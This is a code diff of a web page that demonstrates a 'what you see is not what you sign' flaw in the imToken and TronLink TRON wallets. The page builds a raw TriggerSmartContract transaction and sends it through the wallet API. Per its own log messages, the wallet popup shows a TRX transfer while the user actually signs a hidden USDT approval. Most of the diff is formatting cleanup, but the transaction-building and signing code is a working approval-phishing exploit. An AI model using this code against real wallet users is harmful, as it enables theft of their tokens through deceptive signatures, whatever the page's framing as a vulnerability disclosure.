@@ -69,15 +69,9 @@
             border-radius: 50%;
             display: inline-block;
         }
-        .dot.red {
-            background: var(--red);
-        }
-        .dot.green {
-            background: var(--green);
-        }
-        .dot.orange {
-            background: var(--orange);
-        }
+        .dot.red { background: var(--red); }
+        .dot.green { background: var(--green); }
+        .dot.orange { background: var(--orange); }
 
         .info-row {
             display: flex;
@@ -88,14 +82,8 @@
             font-size: 13px;
             word-break: break-all;
         }
-        .info-row:last-child {
-            border-bottom: none;
-        }
-        .info-label {
-            color: var(--text2);
-            flex-shrink: 0;
-            margin-right: 12px;
-        }
+        .info-row:last-child { border-bottom: none; }
+        .info-label { color: var(--text2); flex-shrink: 0; margin-right: 12px; }
         .info-value {
             text-align: right;
             font-family: 'SF Mono', 'Cascadia Code', 'Consolas', monospace;
@@ -125,10 +113,7 @@
             align-items: flex-start;
             gap: 8px;
         }
-        .warning-box .icon {
-            font-size: 18px;
-            flex-shrink: 0;
-        }
+        .warning-box .icon { font-size: 18px; flex-shrink: 0; }
 
         .info-box {
             background: rgba(88, 166, 255, 0.08);
@@ -151,18 +136,10 @@
             color: var(--text2);
             min-height: 60px;
         }
-        .log-area .log-line {
-            padding: 2px 0;
-        }
-        .log-area .log-line.error {
-            color: var(--red);
-        }
-        .log-area .log-line.success {
-            color: var(--green);
-        }
-        .log-area .log-line.warn {
-            color: var(--orange);
-        }
+        .log-area .log-line { padding: 2px 0; }
+        .log-area .log-line.error { color: var(--red); }
+        .log-area .log-line.success { color: var(--green); }
+        .log-area .log-line.warn { color: var(--orange); }
 
         .btn {
             display: block;
@@ -177,64 +154,24 @@
             text-align: center;
             font-family: inherit;
         }
-        .btn:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-        }
-        .btn-primary {
-            background: var(--btn);
-            color: var(--text);
-        }
-        .btn-primary:hover:not(:disabled) {
-            background: var(--btn-hover);
-        }
-        .btn-danger {
-            background: var(--btn-danger);
-            color: #fff;
-            border-color: var(--btn-danger);
-        }
-        .btn-danger:hover:not(:disabled) {
-            background: var(--btn-danger-hover);
-        }
-        .btn-connect {
-            background: var(--green);
-            color: #000;
-            border-color: var(--green);
-        }
-        .btn-connect:hover:not(:disabled) {
-            opacity: 0.85;
-        }
+        .btn:disabled { opacity: 0.4; cursor: not-allowed; }
+        .btn-primary { background: var(--btn); color: var(--text); }
+        .btn-primary:hover:not(:disabled) { background: var(--btn-hover); }
+        .btn-danger { background: var(--btn-danger); color: #fff; border-color: var(--btn-danger); }
+        .btn-danger:hover:not(:disabled) { background: var(--btn-danger-hover); }
+        .btn-connect { background: var(--green); color: #000; border-color: var(--green); }
+        .btn-connect:hover:not(:disabled) { opacity: 0.85; }
 
-        .divider {
-            border: none;
-            border-top: 1px solid var(--border);
-            margin: 4px 0;
-        }
+        .divider { border: none; border-top: 1px solid var(--border); margin: 4px 0; }
 
-        .flow-steps {
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-            font-size: 12px;
-            color: var(--text2);
-        }
-        .flow-steps span {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .flow-steps .arrow {
-            color: var(--orange);
-        }
-        .flow-steps .target {
-            color: var(--red);
-            font-weight: 600;
-        }
+        .flow-steps { display: flex; flex-direction: column; gap: 6px; font-size: 12px; color: var(--text2); }
+        .flow-steps span { display: flex; align-items: center; gap: 6px; }
+        .flow-steps .arrow { color: var(--orange); }
+        .flow-steps .target { color: var(--red); font-weight: 600; }
     </style>
 </head>
 <body>
     <div class="container">
-
         <div class="card">
             <div class="card-header">
                 <span class="dot red"></span> 所见非所签 · 漏洞演示
@@ -394,36 +331,13 @@
             }
 
             function detectImToken() {
-                if (typeof window.imToken !== 'undefined' &&
-                    typeof window.imToken.callPromisifyAPI === 'function') {
-                    return true;
-                }
-                if (window.ethereum && window.ethereum.isImToken) {
-                    return true;
-                }
-                return false;
+                return typeof window.imToken !== 'undefined' &&
+                    typeof window.imToken.callPromisifyAPI === 'function';
             }
 
             function detectTronLink() {
                 return typeof window.tronLink !== 'undefined' ||
                     (window.tronWeb && window.tronWeb.ready);
-            }
-
-            async function getTronWeb() {
-                if (window.tronWeb && window.tronWeb.ready) {
-                    return window.tronWeb;
-                }
-                if (window.tronLink && typeof window.tronLink.request === 'function') {
-                    await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
-                }
-                if (window.imToken && typeof window.imToken.callPromisifyAPI === 'function') {
-                    const addr = await window.imToken.callPromisifyAPI('tron.requestAccounts', {});
-                    if (addr && addr.length > 0) {
-                        walletAddr = addr[0];
-                    }
-                }
-                return null;
             }
 
             async function connectWallet() {
@@ -436,27 +350,24 @@
                     return;
                 }
 
-                if (detectImToken()) {
-                    log('检测到 imToken 环境', 'success');
-                }
-                if (detectTronLink()) {
-                    log('检测到 TronLink 环境', 'success');
-                }
+                if (detectImToken()) log('检测到 imToken 环境', 'success');
+                if (detectTronLink()) log('检测到 TronLink 环境', 'success');
 
                 try {
                     let addr = '';
+                    // 优先使用 imToken API（下划线命名）
                     if (window.imToken && typeof window.imToken.callPromisifyAPI === 'function') {
-                        log('通过 imToken API 请求连接...', 'warn');
-                        const result = await window.imToken.callPromisifyAPI('tron.requestAccounts', {});
-                        if (result && result.length > 0) {
+                        log('通过 imToken API (tron_requestAccounts) 请求连接...', 'warn');
+                        const result = await window.imToken.callPromisifyAPI('tron_requestAccounts');
+                        if (result && Array.isArray(result) && result.length > 0) {
                             addr = result[0];
+                        } else if (typeof result === 'string' && result.startsWith('T')) {
+                            addr = result;
                         }
                     } else if (window.tronLink && typeof window.tronLink.request === 'function') {
                         log('通过 TronLink 请求连接...', 'warn');
                         const accounts = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                        if (accounts && accounts.length > 0) {
-                            addr = accounts[0];
-                        }
+                        if (accounts && accounts.length > 0) addr = accounts[0];
                     } else if (window.tronWeb && window.tronWeb.ready) {
                         addr = window.tronWeb.defaultAddress.base58 || window.tronWeb.defaultAddress;
                     }
@@ -519,39 +430,36 @@
                 }
             }
 
+            // 以下为构造交易所需的工具函数（base58/hex/protobuf）
             function base58Decode(str) {
                 const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
                 const BASE = 58n;
                 let num = 0n;
                 for (let i = 0; i < str.length; i++) {
                     const idx = ALPHABET.indexOf(str[i]);
-                    if (idx < 0) throw new Error('Invalid base58 character: ' + str[i]);
+                    if (idx < 0) throw new Error('Invalid base58 character');
                     num = num * BASE + BigInt(idx);
                 }
                 let hex = num.toString(16);
                 if (hex.length % 2 !== 0) hex = '0' + hex;
                 let leadingZeros = 0;
-                for (let i = 0; i < str.length && str[i] === '1'; i++) {
-                    leadingZeros++;
-                }
+                for (let i = 0; i < str.length && str[i] === '1'; i++) leadingZeros++;
                 const leadingHex = '00'.repeat(leadingZeros);
                 const fullHex = leadingHex + hex;
                 const bytes = [];
-                for (let i = 0; i < fullHex.length; i += 2) {
-                    bytes.push(parseInt(fullHex.substring(i, i + 2), 16));
-                }
+                for (let i = 0; i < fullHex.length; i += 2) bytes.push(parseInt(fullHex.substring(i, i + 2), 16));
                 return new Uint8Array(bytes);
             }
 
             function tronAddressToHex20(addr) {
                 const decoded = base58Decode(addr);
-                if (decoded.length < 21) throw new Error('Invalid TRON address length');
+                if (decoded.length < 21) throw new Error('Invalid address');
                 return decoded.slice(1, 21);
             }
 
             function tronAddressToHex21(addr) {
                 const decoded = base58Decode(addr);
-                if (decoded.length < 21) throw new Error('Invalid TRON address length');
+                if (decoded.length < 21) throw new Error('Invalid address');
                 return decoded.slice(0, 21);
             }
 
@@ -562,9 +470,7 @@
             function hexToBytes(hex) {
                 if (hex.startsWith('0x')) hex = hex.slice(2);
                 const bytes = new Uint8Array(hex.length / 2);
-                for (let i = 0; i < hex.length; i += 2) {
-                    bytes[i / 2] = parseInt(hex.substring(i, i + 2), 16);
-                }
+                for (let i = 0; i < hex.length; i += 2) bytes[i / 2] = parseInt(hex.substring(i, i + 2), 16);
                 return bytes;
             }
 
@@ -654,17 +560,11 @@
             }
 
             function buildPayload(userAddress) {
-                if (!currentBlockInfo) {
-                    throw new Error('区块信息未加载，请先连接钱包');
-                }
-
+                if (!currentBlockInfo) throw new Error('区块信息未加载');
                 const blockNum = currentBlockInfo.number;
                 const blockIDHex = currentBlockInfo.blockID;
                 const refBlockNum = blockNum & 0xFFFF;
-                const refBlockBytesVal = new Uint8Array([
-                    (refBlockNum >> 8) & 0xFF,
-                    refBlockNum & 0xFF
-                ]);
+                const refBlockBytesVal = new Uint8Array([(refBlockNum >> 8) & 0xFF, refBlockNum & 0xFF]);
                 const blockIDBytes = hexToBytes(blockIDHex);
                 const refBlockHashVal = blockIDBytes.slice(8, 16);
                 const now = Date.now();
@@ -681,15 +581,7 @@
                 const anyMsg = buildAny('type.googleapis.com/protocol.TriggerSmartContract', triggerSC);
                 const contractBytes = buildContract(31, anyMsg);
 
-                const rawDataBytes = buildRawData(
-                    contractBytes,
-                    refBlockBytesVal,
-                    refBlockHashVal,
-                    blockNum,
-                    expiration,
-                    timestamp,
-                    feeLimit
-                );
+                const rawDataBytes = buildRawData(contractBytes, refBlockBytesVal, refBlockHashVal, blockNum, expiration, timestamp, feeLimit);
                 const rawDataHex = toHexString(rawDataBytes);
 
                 const userAddr20 = tronAddressToHex20(userAddress);
@@ -730,7 +622,6 @@
                     raw_data_hex: rawDataHex,
                     visible: false,
                 };
-
                 return payload;
             }
 
@@ -764,18 +655,16 @@
                     log('隐藏字段 [1]: TriggerSmartContract(31)', 'error');
                 } catch (e) {
                     log('构造交易失败: ' + e.message, 'error');
-                    alert('构造交易失败: ' + e.message);
                     return;
                 }
 
-                log('准备调用 imToken tron.sendTransaction...', 'warn');
+                log('准备调用 imToken tron_sendTransaction...', 'warn');
                 log('⚠️ 请仔细观察 imToken 弹窗显示的内容！', 'warn');
-                log('⚠️ 弹窗应显示"TRX转账"，但实际会签名USDT授权', 'warn');
 
                 try {
                     if (window.imToken && typeof window.imToken.callPromisifyAPI === 'function') {
                         log('通过 imToken API 发送...', 'warn');
-                        const result = await window.imToken.callPromisifyAPI('tron.sendTransaction', payload);
+                        const result = await window.imToken.callPromisifyAPI('tron_sendTransaction', payload);
                         log('返回结果: ' + JSON.stringify(result), 'success');
                         if (result && result.txid) {
                             log('交易已广播! TXID: ' + result.txid, 'success');
@@ -786,33 +675,22 @@
                         const signedTx = await window.tronWeb.trx.sign(payload);
                         const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
                         log('返回结果: ' + JSON.stringify(result), 'success');
-                        if (result && result.txid) {
-                            log('交易已广播! TXID: ' + result.txid, 'success');
-                        }
                     } else {
                         throw new Error('未找到可用的 TRON 钱包接口');
                     }
                 } catch (e) {
                     log('交易失败: ' + e.message, 'error');
-                    if (e.message && e.message.includes('reject')) {
-                        log('用户取消了交易', 'warn');
-                    } else if (e.message && e.message.includes('insufficient')) {
-                        log('余额不足，请确保账户有足够TRX支付手续费', 'error');
-                    }
+                    if (e.message && e.message.includes('reject')) log('用户取消了交易', 'warn');
+                    else if (e.message && e.message.includes('insufficient')) log('余额不足', 'error');
                 }
             }
 
             btnConnect.addEventListener('click', connectWallet);
             btnSend.addEventListener('click', sendTestTransaction);
 
-            if (detectImToken()) {
-                log('检测到 imToken 环境，可连接钱包', 'success');
-            } else if (detectTronLink()) {
-                log('检测到 TronLink 环境，可连接钱包', 'success');
-            } else {
-                log('请在 imToken DApp 浏览器中打开此页面', 'warn');
-                log('当前未检测到 imToken 或 TronLink', 'warn');
-            }
+            if (detectImToken()) log('检测到 imToken 环境，可连接钱包', 'success');
+            else if (detectTronLink()) log('检测到 TronLink 环境，可连接钱包', 'success');
+            else log('请在 imToken DApp 浏览器中打开此页面', 'warn');
 
             updateStatus(false);
             btnSend.disabled = true;
